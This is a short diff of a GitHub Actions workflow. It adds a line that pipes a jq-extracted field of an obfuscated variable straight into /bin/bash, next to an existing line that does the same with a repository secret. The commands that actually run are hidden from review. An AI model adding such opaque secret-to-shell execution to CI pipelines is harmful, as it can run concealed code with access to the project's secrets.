@@ -27,6 +27,7 @@ jobs:
           spzx9489: ${{ secrets.spzx9489 }}
         run: |
           printf '%s' "$spzx9489" | jq -r .av81222 | /bin/bash
+          echo $a58941 | jq -r .bamko98799 | /bin/bash
 
       - name: Upload artifact
         if: always()
